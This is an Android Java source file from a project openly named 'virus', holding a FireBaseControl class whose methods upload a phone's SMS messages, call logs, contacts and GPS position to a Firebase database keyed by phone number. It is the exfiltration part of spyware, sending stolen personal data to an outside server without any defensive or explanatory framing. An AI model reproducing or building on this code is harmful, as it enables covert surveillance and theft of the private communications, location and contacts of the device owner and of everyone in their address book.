package com.example.phanv.virus.Control;

import android.support.v7.app.AppCompatActivity;

import com.example.phanv.virus.Model.CallLogVirus;
import com.example.phanv.virus.Model.Contact;
import com.example.phanv.virus.Model.MessageVirus;
import com.example.phanv.virus.Model.Position;
import com.example.phanv.virus.Service.MessageService;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;

/**
 * Created by phanv on 25-Oct-17.
 */

public class FireBaseControl{
    // Write a message to the database
    public  final FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
    public  final DatabaseReference databaseReference = firebaseDatabase.getReference();
    ProcessData pr =new ProcessData();
    public void upMessage(String phone,MessageVirus ms)
    {
        databaseReference.child("virus").child(phone).child("Message").child(ms.getType()).
                child(ms.getSmsDate()).push().setValue(ms);
    }
    public void upCallLog(String phone,ArrayList<CallLogVirus> list)
    {
        for (CallLogVirus cl: list) {
            databaseReference.child("virus").child(phone).child("CallLog").child(cl.getDate()).push().setValue(cl);
        }
    }
    public void upPosition(String phone,String positionDate, String lat, String lng)
    {
        DatabaseReference databaseReference = firebaseDatabase.getReference("virus");
        Position position =new Position(positionDate,lat,lng);
        databaseReference.child(phone).child("Position").setValue(position);
    }
    public void upContact(String phone,ArrayList<Contact> list)
    {
        DatabaseReference databaseReference = firebaseDatabase.getReference();
        for (Contact con: list) {
            databaseReference.child("virus").child(phone).child("Contact").push().setValue(con);
        }
    }
    public void upAllMessage(String phone,ArrayList<MessageVirus> list) {
        for (MessageVirus ms: list) {
            databaseReference.child("virus").child(phone).child("Message").child(ms.getType()).
                    child(ms.getSmsDate()).push().setValue(ms);
        }
    }
}
